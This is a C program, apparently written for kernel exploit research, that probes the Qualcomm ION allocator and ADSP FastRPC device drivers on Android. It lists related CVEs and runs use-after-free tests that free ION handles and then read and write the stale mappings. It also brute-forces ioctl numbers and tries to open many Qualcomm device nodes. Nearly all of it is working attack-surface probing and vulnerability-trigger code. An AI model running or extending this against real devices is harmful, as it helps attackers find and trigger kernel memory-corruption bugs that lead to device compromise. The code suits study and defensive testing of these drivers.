#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>

/*
 * ION + ADSP RPC Attack Surface Probe
 *
 * /dev/ion (chr 10,94) — Qualcomm ION memory allocator
 * /dev/adsprpc-smd (chr 222,0) — Qualcomm ADSP FastRPC
 *
 * ION CVEs on 3.10 Qualcomm:
 *   CVE-2016-9120: ION mmap/free race → UAF
 *   CVE-2017-0524: ION handle-to-fd leak
 *   CVE-2015-1593: ION custom ioctl overflow
 *
 * ADSP CVEs:
 *   CVE-2016-5346: adsprpc information leak
 *   CVE-2017-11059: adsprpc buffer overflow
 */

/* ION ioctl definitions (from ion.h) */
#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC       _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE        _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP         _IOWR(ION_IOC_MAGIC, 2, struct ion_fd_data)
#define ION_IOC_SHARE       _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
#define ION_IOC_IMPORT      _IOWR(ION_IOC_MAGIC, 5, struct ion_fd_data)
#define ION_IOC_SYNC        _IOWR(ION_IOC_MAGIC, 7, struct ion_fd_data)
#define ION_IOC_CUSTOM      _IOWR(ION_IOC_MAGIC, 6, struct ion_custom_data)

/* ION heap masks */
#define ION_HEAP_SYSTEM       (1 << 0)
#define ION_HEAP_SYSTEM_CONTIG (1 << 1)
#define ION_HEAP_CARVEOUT     (1 << 2)
#define ION_HEAP_TYPE_DMA     (1 << 3)
#define ION_HEAP_IOMMU        (1 << 25)

/* ION flags */
#define ION_FLAG_CACHED       (1 << 0)
#define ION_FLAG_CACHED_NEEDS_SYNC (1 << 1)
#define ION_SECURE            (1 << 31)

/* ION handle is platform-specific. On 64-bit, it's a pointer or int.
 * Use a void* for maximum compatibility. */
typedef void *ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_custom_data {
    unsigned int cmd;
    unsigned long arg;
};

/* Qualcomm-specific ION custom ioctls */
#define ION_IOC_CLEAN_CACHES    0
#define ION_IOC_INV_CACHES      1
#define ION_IOC_CLEAN_INV_CACHES 2
#define ION_IOC_PREFETCH         3
#define ION_IOC_DRAIN            4

struct ion_flush_data {
    ion_user_handle_t handle;
    int fd;
    void *vaddr;
    unsigned int offset;
    unsigned int length;
};

int main(void) {
    printf("=== ION + ADSP RPC Attack Surface Probe ===\n");
    printf("uid=%d pid=%d\n\n", getuid(), getpid());
    signal(SIGPIPE, SIG_IGN);

    /* === ION Probe === */
    printf("--- ION Memory Allocator ---\n");
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) {
        printf("  FATAL: open: %s\n", strerror(errno));
    } else {
        printf("  /dev/ion: fd=%d\n", ion_fd);

        /* Try allocating from different heaps */
        unsigned int heaps[] = {
            ION_HEAP_SYSTEM,
            ION_HEAP_SYSTEM_CONTIG,
            ION_HEAP_IOMMU,
            ION_HEAP_CARVEOUT,
            ION_HEAP_TYPE_DMA,
            (1 << 4), (1 << 5), (1 << 6), (1 << 7),
            (1 << 8), (1 << 9), (1 << 10),
            (1 << 21), (1 << 22), (1 << 23), (1 << 24),
            0
        };
        const char *heap_names[] = {
            "SYSTEM", "SYSTEM_CONTIG", "IOMMU", "CARVEOUT", "DMA",
            "heap4", "heap5", "heap6", "heap7",
            "heap8", "heap9", "heap10",
            "heap21", "heap22", "heap23", "heap24",
            NULL
        };

        ion_user_handle_t good_handle = NULL;
        int good_fd = -1;

        for (int i = 0; heaps[i]; i++) {
            struct ion_allocation_data alloc = {0};
            alloc.len = 4096;
            alloc.align = 4096;
            alloc.heap_id_mask = heaps[i];
            alloc.flags = ION_FLAG_CACHED;

            int ret = ioctl(ion_fd, ION_IOC_ALLOC, &alloc);
            if (ret == 0) {
                printf("  ALLOC %-15s: OK handle=%p\n", heap_names[i], alloc.handle);

                /* Try to get an fd for mmap */
                struct ion_fd_data fd_data = {0};
                fd_data.handle = alloc.handle;
                ret = ioctl(ion_fd, ION_IOC_SHARE, &fd_data);
                if (ret == 0) {
                    printf("    SHARE: fd=%d\n", fd_data.fd);

                    /* mmap it */
                    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                   MAP_SHARED, fd_data.fd, 0);
                    if (p != MAP_FAILED) {
                        printf("    mmap: %p — R/W OK\n", p);

                        /* Write and verify */
                        uint32_t *u = (uint32_t *)p;
                        u[0] = 0xCAFEBABE;
                        printf("    write test: %08x\n", u[0]);

                        if (!good_handle) {
                            good_handle = alloc.handle;
                            good_fd = fd_data.fd;
                        } else {
                            munmap(p, 4096);
                            close(fd_data.fd);
                        }
                    } else {
                        printf("    mmap: FAIL (errno=%d)\n", errno);
                        close(fd_data.fd);
                    }
                } else {
                    printf("    SHARE: FAIL (errno=%d)\n", errno);
                }

                /* Free if not saved */
                if (alloc.handle != good_handle) {
                    struct ion_handle_data hd = { .handle = alloc.handle };
                    ioctl(ion_fd, ION_IOC_FREE, &hd);
                }
            } else if (errno != ENODEV && errno != EINVAL) {
                printf("  ALLOC %-15s: FAIL (errno=%d %s)\n",
                       heap_names[i], errno, strerror(errno));
            }
        }

        /* === ION UAF Test: alloc → mmap → free → stale access === */
        printf("\n  --- ION UAF Test ---\n");
        if (good_handle) {
            /* We already have a handle and fd */
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                           MAP_SHARED, good_fd, 0);
            if (p != MAP_FAILED) {
                uint32_t *u = (uint32_t *)p;
                for (int i = 0; i < 1024; i++)
                    u[i] = 0xF00D0000 | i;

                printf("  Pre-free: [0]=%08x [1023]=%08x\n", u[0], u[1023]);

                /* Free the ION handle */
                struct ion_handle_data hd = { .handle = good_handle };
                int ret = ioctl(ion_fd, ION_IOC_FREE, &hd);
                printf("  ION_IOC_FREE: %s\n", ret == 0 ? "OK" : "FAIL");

                /* Try reading stale mapping */
                volatile uint32_t v0 = u[0];
                volatile uint32_t v1023 = u[1023];
                printf("  Post-free: [0]=%08x [1023]=%08x %s\n",
                       v0, v1023,
                       (v0 == 0xF00D0000 && v1023 == (0xF00D0000 | 1023)) ?
                       "(original — stale mapping persists)" :
                       v0 == 0 ? "(zeroed — page freed)" :
                       "(CHANGED — possible kernel data!)");

                /* Try writing */
                u[0] = 0xDEADBEEF;
                v0 = u[0];
                printf("  Post-free write: %08x %s\n", v0,
                       v0 == 0xDEADBEEF ? "WRITE UAF!" : "write failed");

                munmap(p, 4096);
            }
            close(good_fd);
        }

        /* === ION Custom ioctl scan === */
        printf("\n  --- ION Custom ioctls ---\n");
        for (unsigned int cmd = 0; cmd <= 20; cmd++) {
            struct ion_custom_data cd = { .cmd = cmd, .arg = 0 };
            int ret = ioctl(ion_fd, ION_IOC_CUSTOM, &cd);
            if (ret == 0 || (ret < 0 && errno != ENOTTY && errno != EINVAL)) {
                printf("  CUSTOM cmd=%u: ret=%d errno=%d\n",
                       cmd, ret, ret < 0 ? errno : 0);
            }
        }

        /* === ION: alloc many, free all, check for overlap === */
        printf("\n  --- ION Bulk alloc/free ---\n");
        {
            #define ION_BATCH 50
            ion_user_handle_t handles[ION_BATCH] = {0};
            int fds[ION_BATCH] = {0};
            void *maps[ION_BATCH] = {0};
            int cnt = 0;

            for (int i = 0; i < ION_BATCH; i++) {
                struct ion_allocation_data alloc = {0};
                alloc.len = 4096;
                alloc.align = 4096;
                alloc.heap_id_mask = ION_HEAP_SYSTEM;
                alloc.flags = ION_FLAG_CACHED;
                if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) != 0) break;

                struct ion_fd_data fd_data = { .handle = alloc.handle };
                if (ioctl(ion_fd, ION_IOC_SHARE, &fd_data) != 0) {
                    struct ion_handle_data hd = { .handle = alloc.handle };
                    ioctl(ion_fd, ION_IOC_FREE, &hd);
                    break;
                }

                void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd_data.fd, 0);
                if (p == MAP_FAILED) {
                    close(fd_data.fd);
                    struct ion_handle_data hd = { .handle = alloc.handle };
                    ioctl(ion_fd, ION_IOC_FREE, &hd);
                    break;
                }

                handles[cnt] = alloc.handle;
                fds[cnt] = fd_data.fd;
                maps[cnt] = p;
                /* Write unique pattern */
                ((uint32_t *)p)[0] = 0xBEEF0000 | cnt;
                cnt++;
            }
            printf("  Allocated %d ION buffers\n", cnt);

            /* Free all handles */
            for (int i = 0; i < cnt; i++) {
                struct ion_handle_data hd = { .handle = handles[i] };
                ioctl(ion_fd, ION_IOC_FREE, &hd);
            }
            printf("  Freed all %d handles\n", cnt);

            /* Check stale mappings */
            int changed = 0;
            for (int i = 0; i < cnt; i++) {
                volatile uint32_t val = ((volatile uint32_t *)maps[i])[0];
                uint32_t expected = 0xBEEF0000 | i;
                if (val != expected) {
                    printf("  [%d] CHANGED: expected=%08x got=%08x\n",
                           i, expected, val);
                    changed++;
                }
            }
            printf("  Changed: %d/%d %s\n", changed, cnt,
                   changed ? "PAGES FREED!" : "(all original)");

            for (int i = 0; i < cnt; i++) {
                if (maps[i]) munmap(maps[i], 4096);
                if (fds[i]) close(fds[i]);
            }
        }

        close(ion_fd);
    }

    /* === ADSP RPC Probe === */
    printf("\n--- ADSP RPC (/dev/adsprpc-smd) ---\n");
    int adsp_fd = open("/dev/adsprpc-smd", O_RDWR);
    if (adsp_fd < 0) {
        printf("  open: %s\n", strerror(errno));
    } else {
        printf("  /dev/adsprpc-smd: fd=%d\n", adsp_fd);

        /* Try to discover ioctls.
         * adsprpc uses ioctl type 'R' (0x52) typically.
         * Common: FASTRPC_IOCTL_INVOKE (0), ALLOC_DMA_BUFF, INIT, etc.
         */

        /* Scan for valid ioctl numbers */
        printf("  Scanning ioctls (type 'R' = 0x52)...\n");
        for (int nr = 0; nr <= 20; nr++) {
            unsigned char buf[256] = {0};

            /* Try IOWR (dir=3) with various sizes */
            int sizes[] = {4, 8, 16, 32, 64, 128, 0};
            for (int s = 0; sizes[s]; s++) {
                unsigned long cmd = (3UL << 30) | ((unsigned long)sizes[s] << 16) |
                                    (0x52 << 8) | nr;
                int ret = ioctl(adsp_fd, cmd, buf);
                if (ret == 0 || (ret < 0 && errno != ENOTTY)) {
                    printf("    IOWR(0x52, 0x%02x, %d): ret=%d errno=%d\n",
                           nr, sizes[s], ret, ret < 0 ? errno : 0);
                    if (ret == 0) {
                        /* Print first 16 bytes of response */
                        printf("      data: ");
                        for (int j = 0; j < 16 && j < sizes[s]; j++)
                            printf("%02x ", buf[j]);
                        printf("\n");
                    }
                    break;
                }
            }

            /* Try IOW (dir=1) */
            for (int s = 0; sizes[s]; s++) {
                unsigned long cmd = (1UL << 30) | ((unsigned long)sizes[s] << 16) |
                                    (0x52 << 8) | nr;
                int ret = ioctl(adsp_fd, cmd, buf);
                if (ret == 0 || (ret < 0 && errno != ENOTTY)) {
                    printf("    IOW(0x52, 0x%02x, %d): ret=%d errno=%d\n",
                           nr, sizes[s], ret, ret < 0 ? errno : 0);
                    break;
                }
            }

            /* Try IOR (dir=2) */
            for (int s = 0; sizes[s]; s++) {
                unsigned long cmd = (2UL << 30) | ((unsigned long)sizes[s] << 16) |
                                    (0x52 << 8) | nr;
                int ret = ioctl(adsp_fd, cmd, buf);
                if (ret == 0 || (ret < 0 && errno != ENOTTY)) {
                    printf("    IOR(0x52, 0x%02x, %d): ret=%d errno=%d\n",
                           nr, sizes[s], ret, ret < 0 ? errno : 0);
                    break;
                }
            }
        }

        /* Also try non-standard ioctl types (some adsprpc uses type 0) */
        printf("\n  Scanning alternate ioctl types...\n");
        unsigned char types[] = {0x00, 'r', 'A', 'Q', 0};
        for (int t = 0; types[t]; t++) {
            for (int nr = 0; nr <= 15; nr++) {
                unsigned char buf[128] = {0};
                unsigned long cmd = (3UL << 30) | (64UL << 16) |
                                    ((unsigned long)types[t] << 8) | nr;
                int ret = ioctl(adsp_fd, cmd, buf);
                if (ret == 0 || (ret < 0 && errno != ENOTTY && errno != EINVAL)) {
                    printf("    IOWR(0x%02x, 0x%02x, 64): ret=%d errno=%d\n",
                           types[t], nr, ret, ret < 0 ? errno : 0);
                }
            }
        }

        close(adsp_fd);
    }

    /* === Check for other Qualcomm-specific devices === */
    printf("\n--- Other Qualcomm devices ---\n");
    {
        const char *qcom_devs[] = {
            "/dev/kgsl-3d0",
            "/dev/msm_dsps",
            "/dev/msm_rotator",
            "/dev/msm_vidc_reg",
            "/dev/msm_vidc_dec",
            "/dev/msm_vidc_enc",
            "/dev/msm_camera",
            "/dev/msm_gemini",
            "/dev/msm_jpeg",
            "/dev/msm_thermal_query",
            "/dev/msm_rmnet",
            "/dev/qce",
            "/dev/qseecom",
            "/dev/smd0",
            "/dev/smd_cntl",
            "/dev/smem_log",
            "/dev/subsys_adsp",
            "/dev/subsys_modem",
            "/dev/wcnss_wlan",
            "/dev/wcd-dsp-glink",
            "/dev/v4l-subdev0",
            "/dev/v4l-subdev1",
            "/dev/video0",
            "/dev/video1",
            "/dev/video32",
            "/dev/video33",
            "/dev/media0",
            NULL
        };

        for (int i = 0; qcom_devs[i]; i++) {
            int fd = open(qcom_devs[i], O_RDWR);
            if (fd < 0) fd = open(qcom_devs[i], O_RDONLY);
            if (fd >= 0) {
                printf("  %-30s OPEN (fd=%d)\n", qcom_devs[i], fd);
                close(fd);
            }
        }
    }

    printf("\n=== Done ===\n");
    return 0;
}
